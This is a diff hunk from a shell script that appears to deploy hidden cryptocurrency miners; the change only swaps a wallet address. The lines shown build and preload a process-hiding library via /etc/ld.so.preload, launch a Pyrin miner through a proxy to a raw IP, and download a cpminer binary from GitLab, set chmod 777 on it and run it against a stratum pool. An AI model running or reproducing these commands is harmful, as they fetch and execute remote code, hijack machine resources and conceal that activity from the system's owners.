@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qp3dslwvrkxf3qhj6gym52wtadqdqcf39q7y94zmreqyetrwes3r2um5ed0sw.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QViY3qooQy728VDJkd4CtUgzV3pKiqfJMX -t4
+./graftcp/graftcp ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qrphmq60dgpe05nccq8jvhvdt5fd3elrza2y9xj0d4u5tqzfnmcrsx69ash8a.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QViY3qooQy728VDJkd4CtUgzV3pKiqfJMX -t4
